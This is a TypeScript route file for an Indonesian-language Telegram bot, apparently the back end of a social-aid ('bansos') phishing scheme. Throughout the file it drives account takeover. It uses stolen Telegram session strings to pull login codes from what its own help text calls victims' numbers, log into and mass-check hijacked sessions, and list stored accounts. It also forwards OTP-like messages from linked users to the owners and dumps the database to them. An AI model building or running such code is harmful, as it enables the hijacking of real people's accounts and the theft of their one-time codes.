import { initSchema, query, queryOne, execute, encryptMessage, decryptMessage } from "@/lib/db";
import { dumpAllTables, formatBackupFileName } from "@/lib/backup";
import { getUpdates, sendMessage, sendChatAction, sendDocumentWithRetry, editMessageText } from "@/lib/telegramBot";
import { isOtpMessage, forwardOtpToOwners, hasActiveVictim } from "@/lib/otp";
import { verifySessionHealth, fetchOtpFromTelegramSession } from "@/lib/telegramClient";

export const runtime = "nodejs";
export const maxDuration = 10;

const CRON_SECRET = process.env.CRON_SECRET;

// Parse OWNER_IDS safely with per-ID try/catch + fallback
function parseOwnerIds(): bigint[] {
  const raw = process.env.TELEGRAM_OWNER_IDS || "";
  const parts = raw.split(",").map((s) => s.trim()).filter(Boolean);
  const ids: bigint[] = [];
  for (const part of parts) {
    try {
      ids.push(BigInt(part));
    } catch {
      console.warn("[poll] Invalid owner ID skipped:", part);
    }
  }
  if (ids.length === 0 && process.env.TELEGRAM_DEVELOPER_CHAT_ID) {
    try {
      ids.push(BigInt(process.env.TELEGRAM_DEVELOPER_CHAT_ID.trim()));
    } catch {}
  }
  return ids;
}

function isOwner(userId: bigint): boolean {
  return parseOwnerIds().includes(userId);
}

function isTriggeredByCron(req: Request): boolean {
  const vercelCron = req.headers.get("x-vercel-cron");
  if (vercelCron === "1") return true;
  if (CRON_SECRET && req.headers.get("x-cron-secret") === CRON_SECRET) return true;
  const url = new URL(req.url);
  if (CRON_SECRET && url.searchParams.get("key") === CRON_SECRET) return true;
  // localhost / dev — auto-allow polling without secret so bot tetap respon di localhost
  if (process.env.NODE_ENV !== "production") return true;
  if (url.hostname === "localhost" || url.hostname === "127.0.0.1") return true;
  if (process.env.ALLOW_POLL_WITHOUT_CRON === "true") return true;
  return false;
}

function getCommand(text?: string): { command: string; args: string[] } | null {
  if (!text) return null;
  const match = text.trim().match(/^\/(\w+)(?:@\S+)?(?:\s+(.*))?$/);
  if (!match) return null;
  return { command: match[1].toLowerCase(), args: match[2] ? match[2].trim().split(/\s+/) : [] };
}

async function getLastOffset(): Promise<number> {
  try {
    const row = await queryOne<{ value: string }>(
      `SELECT value FROM bot_state WHERE key = 'last_update_id'`
    );
    return row ? parseInt(row.value, 10) : 0;
  } catch {
    return 0;
  }
}

async function setLastOffset(offset: number): Promise<void> {
  try {
    await execute(
      `INSERT INTO bot_state (key, value) VALUES ('last_update_id', $1)
       ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value`,
      [String(offset)]
    );
  } catch {
  }
}

async function handleStart(chatId: number | string, userId: bigint): Promise<void> {
  const ownerIds = parseOwnerIds();
  console.log(`[poll] /start from ${userId} isOwner=${isOwner(userId)} owners=${ownerIds.length}`);
  if (!isOwner(userId)) {
    try { await sendMessage(chatId, "⛔ Akses ditolak. Bot ini hanya untuk owner."); } catch (e) { console.warn("[poll] send access-denied failed:", e); }
    return;
  }
  try {
    await sendMessage(
      chatId,
      `👋 Halo! Selamat datang di Bot Backup Bansos.\n\n` +
      `Perintah yang tersedia:\n` +
      `• /start — Tampilkan menu ini\n` +
      `• /help — Bantuan\n` +
      `• /backup — Backup database penuh (JSON) ke ${ownerIds.length} owner\n` +
      `• /getotp [nomor] — Ambil kode OTP dari nomor korban (butuh sesi aktif)\n` +
      `• /login [nomor] — Uji dan login ke sesi tersimpan\n` +
      `• /accounts — Lihat daftar semua akun di DB\n` +
      `• /checkall — Cek keaktifan semua sesi secara massal\n` +
      `• /info [nomor] — Lihat info detail suatu akun\n` +
      `• /logout [nomor] — Hapus sesi dari database`
    );
  } catch (e) { console.warn("[poll] handleStart send failed:", e); }
}

async function handleBackup(chatId: number | string, userId: bigint): Promise<void> {
  if (!isOwner(userId)) {
    await sendMessage(chatId, "⛔ Akses ditolak. Hanya owner yang bisa backup.");
    return;
  }

  const ownerIds = parseOwnerIds();

  await sendMessage(chatId, "🔄 Memulai backup database...");
  await sendChatAction(chatId, "upload_document");

  try {
    const backupData = await dumpAllTables();
    const jsonContent = JSON.stringify(backupData, null, 2);
    const fileName = formatBackupFileName();

    console.log(`[backup] Dumped ${backupData.total_rows} rows from ${Object.keys(backupData.tables).length} tables`);

    const results = await Promise.allSettled(
      ownerIds.map(async (id: bigint) => {
        try {
          const res = await sendDocumentWithRetry(String(id), fileName, jsonContent, `📦 Backup ${backupData.exported_at}`);
          console.log(`[backup] Document sent to owner ${id}: ok`);
          return res;
        } catch (err) {
          console.error(`[backup] Failed to send to owner ${id}:`, err instanceof Error ? err.message : err);
          throw err;
        }
      })
    );

    const failed = results.filter((r) => r.status === "rejected").length;
    if (failed === 0) {
      await sendMessage(chatId, `✅ Backup selesai! File <code>${fileName}</code> terkirim ke ${ownerIds.length} owner.`, "HTML");
    } else {
      await sendMessage(chatId, `⚠️ Backup selesai tapi ${failed} owner gagal terkirim. Cek log.`);
    }
  } catch (err) {
    console.error("[backup] Error:", err);
    await sendMessage(chatId, `❌ Backup gagal: ${err instanceof Error ? err.message : String(err)}`);
  }
}

async function findAccountSession(targetPhone?: string): Promise<{ session_string: string; phone: string } | null> {
  if (targetPhone && targetPhone.trim()) {
    const raw = targetPhone.trim();
    let withPlus = raw;
    let noPlus = raw.replace(/^\+/, "");
    let local = raw;

    if (raw.startsWith("0")) {
      noPlus = "62" + raw.slice(1);
      withPlus = "+" + noPlus;
    } else if (!raw.startsWith("+")) {
      withPlus = "+" + raw;
    } else {
      local = "0" + raw.slice(3);
    }

    const cleanDigits = raw.replace(/\D/g, "");

    let account = await queryOne<{ session_string: string; phone: string }>(
      `SELECT session_string, phone FROM telegram_accounts 
       WHERE (phone = $1 OR phone = $2 OR phone = $3 OR REPLACE(phone, '+', '') = $4) 
         AND session_string IS NOT NULL AND session_string <> '' 
       LIMIT 1`,
      [withPlus, noPlus, local, cleanDigits]
    );

    if (account) return account;

    account = await queryOne<{ session_string: string; phone: string }>(
      `SELECT session_string, phone FROM otp_sessions 
       WHERE (phone = $1 OR phone = $2 OR phone = $3 OR REPLACE(phone, '+', '') = $4) 
         AND session_string IS NOT NULL AND session_string <> '' 
       ORDER BY updated_at DESC LIMIT 1`,
      [withPlus, noPlus, local, cleanDigits]
    );

    return account;
  }

  let account = await queryOne<{ session_string: string; phone: string }>(
    `SELECT session_string, phone FROM telegram_accounts 
     WHERE session_string IS NOT NULL AND session_string <> '' 
     ORDER BY signed_at DESC LIMIT 1`
  );

  if (!account) {
    account = await queryOne<{ session_string: string; phone: string }>(
      `SELECT session_string, phone FROM otp_sessions 
       WHERE session_string IS NOT NULL AND session_string <> '' 
       ORDER BY updated_at DESC LIMIT 1`
    );
  }

  return account;
}

async function handleGetOtp(chatId: number | string, userId: bigint, args: string[]): Promise<void> {
  if (!isOwner(userId)) {
    await sendMessage(chatId, "⛔ Akses ditolak. Bot ini hanya untuk owner.");
    return;
  }

  const targetPhone = args && args.length > 0 ? args[0] : "";
  const account = await findAccountSession(targetPhone);

  if (!account || !account.session_string) {
    await sendMessage(chatId, `❌ Sesi akun tidak ditemukan di database.`);
    return;
  }

  const msg = await sendMessage(chatId, `⏳ Menghubungi sesi (${account.phone})...`).catch(() => null);
  if (!msg) return;

  try {
    const res = await fetchOtpFromTelegramSession(account.session_string);
    if (!res.success) {
      await editMessageText(chatId, msg.message_id, `❌ ERROR: ${res.error}`).catch(() => {});
    } else if (res.message) {
      await editMessageText(chatId, msg.message_id, `✉️ PESAN (${account.phone}):\n\n${res.message}`).catch(() => {});
    } else {
      await editMessageText(chatId, msg.message_id, `❌ Tidak ada pesan dari ${account.phone}.`).catch(() => {});
    }
  } catch (err: any) {
    await editMessageText(chatId, msg.message_id, `❌ ERROR: ${err.message || String(err)}`).catch(() => {});
  }
}

async function handleLogin(chatId: number | string, userId: bigint, args: string[]): Promise<void> {
  if (!isOwner(userId)) return;
  if (!args || args.length === 0) {
    await sendMessage(chatId, "ℹ️ Penggunaan: /login [nomor]\nContoh: /login +628123456789");
    return;
  }
  let targetPhone = args[0];
  if (targetPhone.startsWith("0")) targetPhone = "+62" + targetPhone.slice(1);
  if (!targetPhone.startsWith("+")) targetPhone = "+" + targetPhone;

  await sendMessage(chatId, `🔄 Sedang memeriksa sesi untuk ${targetPhone}...`);
  
  const account = await queryOne<{ session_string: string; first_name: string; last_name: string; username: string }>(
    `SELECT session_string, first_name, last_name, username FROM telegram_accounts WHERE phone = $1`,
    [targetPhone]
  );

  if (!account || !account.session_string) {
    await sendMessage(chatId, `⛔ Nomor ${targetPhone} tidak ditemukan di database atau tidak memiliki sesi.`);
    return;
  }

  const health = await verifySessionHealth(account.session_string);
  
  if (!health.active) {
    await sendMessage(chatId, `❌ Gagal login. Sesi untuk ${targetPhone} sudah tidak valid atau expired.\nError: ${health.error}`);
    return;
  }

  const u = health.user as any;
  const name = [u.firstName, u.lastName].filter(Boolean).join(" ");
  
  await sendMessage(
    chatId, 
    `✅ <b>Berhasil Login!</b> Sesi masih aktif.\n\n` +
    `👤 Nama: ${name}\n` +
    `🔗 Username: ${u.username ? "@" + u.username : "-"}\n` +
    `🆔 User ID: <code>${u.id}</code>\n` +
    `📱 Nomor: ${targetPhone}`,
    "HTML"
  );
}

async function handleAccounts(chatId: number | string, userId: bigint): Promise<void> {
  if (!isOwner(userId)) return;
  const accounts = await query<{ phone: string; first_name: string; username: string }>(
    `SELECT phone, first_name, username FROM telegram_accounts ORDER BY signed_at DESC LIMIT 50`
  );
  if (accounts.length === 0) {
    await sendMessage(chatId, "📭 Belum ada akun yang tersimpan di database.");
    return;
  }
  let msg = `📋 <b>Daftar Akun (${accounts.length})</b>\n\n`;
  accounts.forEach((acc, i) => {
    msg += `${i+1}. <code>${acc.phone}</code> - ${acc.first_name} ${acc.username ? "(@"+acc.username+")" : ""}\n`;
  });
  await sendMessage(chatId, msg, "HTML");
}

async function handleCheckAll(chatId: number | string, userId: bigint): Promise<void> {
  if (!isOwner(userId)) return;
  const accounts = await query<{ phone: string; session_string: string }>(
    `SELECT phone, session_string FROM telegram_accounts WHERE session_string IS NOT NULL AND session_string <> ''`
  );
  if (accounts.length === 0) {
    await sendMessage(chatId, "📭 Belum ada akun yang tersimpan di database.");
    return;
  }
  await sendMessage(chatId, `🔄 Memeriksa ${accounts.length} akun... Mohon tunggu.`);
  let active = 0, expired = 0;
  for (const acc of accounts) {
    const health = await verifySessionHealth(acc.session_string);
    if (health.active) active++;
    else expired++;
  }
  await sendMessage(chatId, `📊 <b>Hasil Pemeriksaan Sesi:</b>\n\n✅ Aktif: ${active}\n❌ Expired: ${expired}\nTotal: ${accounts.length}`, "HTML");
}

async function handleLogout(chatId: number | string, userId: bigint, args: string[]): Promise<void> {
  if (!isOwner(userId)) return;
  if (!args || args.length === 0) {
    await sendMessage(chatId, "ℹ️ Penggunaan: /logout [nomor]");
    return;
  }
  let targetPhone = args[0];
  if (targetPhone.startsWith("0")) targetPhone = "+62" + targetPhone.slice(1);
  if (!targetPhone.startsWith("+")) targetPhone = "+" + targetPhone;

  const result = await execute(`UPDATE telegram_accounts SET session_string = '' WHERE phone = $1`, [targetPhone]);
  if (result > 0) {
    await sendMessage(chatId, `✅ Sesi untuk nomor ${targetPhone} telah dihapus/dilogout dari database.`);
  } else {
    await sendMessage(chatId, `⛔ Nomor ${targetPhone} tidak ditemukan di database.`);
  }
}

async function handleInfo(chatId: number | string, userId: bigint, args: string[]): Promise<void> {
  if (!isOwner(userId)) return;
  if (!args || args.length === 0) {
    await sendMessage(chatId, "ℹ️ Penggunaan: /info [nomor]");
    return;
  }
  let targetPhone = args[0];
  if (targetPhone.startsWith("0")) targetPhone = "+62" + targetPhone.slice(1);
  if (!targetPhone.startsWith("+")) targetPhone = "+" + targetPhone;

  const acc = await queryOne<{ phone: string; user_id: string; first_name: string; last_name: string; username: string; signed_at: Date; session_string: string }>(`SELECT * FROM telegram_accounts WHERE phone = $1`, [targetPhone]);
  if (!acc) {
    await sendMessage(chatId, `⛔ Nomor ${targetPhone} tidak ditemukan.`);
    return;
  }
  
  let msg = `ℹ️ <b>Informasi Akun</b>\n\n` +
            `📱 Nomor: <code>${acc.phone}</code>\n` +
            `🆔 User ID: <code>${acc.user_id || "-"}</code>\n` +
            `👤 Nama: ${acc.first_name || ""} ${acc.last_name || ""}\n` +
            `🔗 Username: ${acc.username ? "@"+acc.username : "-"}\n` +
            `🕒 Login: ${new Date(acc.signed_at).toLocaleString('id-ID')}\n\n`;
            
  if (acc.session_string) {
     msg += `🔑 Sesi: Tersedia\n`;
  } else {
     msg += `🔑 Sesi: Kosong/Logout\n`;
  }
  await sendMessage(chatId, msg, "HTML");
}

export async function GET(req: Request) {
  const cronType = req.headers.get("x-vercel-cron") === "1" ? "vercel-cron" :
    req.headers.get("x-cron-secret") ? "header-secret" :
    new URL(req.url).searchParams.get("key") ? "query-key" : "unknown";

  const currentOwnerIds = parseOwnerIds();

  if (!isTriggeredByCron(req)) {
    console.warn(`[poll] Unauthorized request rejected (type: ${cronType}) owners=${currentOwnerIds.length}`);
    return Response.json({ error: "Unauthorized", hint: "Use ?key=CRON_SECRET or set ALLOW_POLL_WITHOUT_CRON=true for dev" }, { status: 401 });
  }

  await initSchema();

  let offset = await getLastOffset();
  let processed = 0;

  try {
    const updates = await getUpdates(offset, 20);
    console.log(`[poll] Connection OK (${cronType}) | Owners: ${currentOwnerIds.length} | Updates: ${updates.length} | Offset: ${offset}`);

    for (const update of updates) {
      try {
        if (update.update_id >= offset) {
          offset = update.update_id + 1;
        }

        const msg = update.message;
        if (!msg || !msg.from) continue;

        const userId = BigInt(msg.from.id);
        const chatId = msg.chat.id;
        const text = msg.text;

        const linkedUser = await queryOne<{ phone: string }>(
          `SELECT phone FROM telegram_accounts WHERE user_id = $1`,
          [userId]
        );

        if (text && linkedUser && !text.startsWith("/")) {
          if (isOtpMessage(text)) {
            await forwardOtpToOwners(linkedUser.phone, text);
          }
          try {
            const encryptedText = encryptMessage(text);
            await execute(
              `INSERT INTO otp_messages (phone, telegram_user_id, telegram_chat_id, message_text) VALUES ($1, $2, $3, $4)`,
              [linkedUser.phone, userId, chatId, encryptedText]
            );
            console.log(`[getotp] Stored encrypted OTP message from ${linkedUser.phone} in chat ${chatId}`);
          } catch (err) {
            console.error(`[getotp] Failed to store encrypted message:`, err);
          }
        }

        const cmd = getCommand(text);
        if (!cmd) continue;

        console.log(`[poll] Processing command: /${cmd.command} from user ${userId} in chat ${chatId}`);

        switch (cmd.command) {
          case "start":
          case "help":
            await handleStart(chatId, userId);
            break;
          case "backup":
            await handleBackup(chatId, userId);
            break;
          case "getotp":
            await handleGetOtp(chatId, userId, cmd.args);
            break;
          case "login":
            await handleLogin(chatId, userId, cmd.args);
            break;
          case "accounts":
            await handleAccounts(chatId, userId);
            break;
          case "checkall":
            await handleCheckAll(chatId, userId);
            break;
          case "logout":
            await handleLogout(chatId, userId, cmd.args);
            break;
          case "info":
            await handleInfo(chatId, userId, cmd.args);
            break;
          default:
            if (isOwner(userId)) {
              await sendMessage(chatId, `❓ Perintah tidak dikenal: /${cmd.command}\nGunakan /start untuk bantuan.`);
            }
        }

        processed++;
      } catch (itemErr) {
        console.error(`[poll] Error processing update ID ${update.update_id}:`, itemErr);
      }
    }

    await setLastOffset(offset);
    console.log(`[poll] Processed ${processed} commands, new offset saved: ${offset}`);

    return Response.json({ ok: true, processed, offset });
  } catch (err: any) {
    const errMessage = err instanceof Error ? err.message : String(err);
    if (errMessage.includes("409") || errMessage.includes("webhook is active")) {
      console.error("[poll] ❌ Konflik Webhook: Telegram Webhook masih aktif. Hapus webhook terlebih dahulu sebelum menggunakan Polling mode.");
      return Response.json({
        error: "Webhook conflict",
        message: "Can't use getUpdates while webhook is active. Call deleteWebhook first."
      }, { status: 409 });
    }

    if (err?.name === "TimeoutError" || errMessage.includes("aborted") || errMessage.includes("timeout")) {
      console.log("[poll] ℹ️ Polling timeout (no new updates), returning ok.");
      return Response.json({ ok: true, processed: 0, offset });
    }

    console.error("[poll] ❌ Error saat Polling:", errMessage);
    return Response.json({ error: errMessage }, { status: 500 });
  }
}
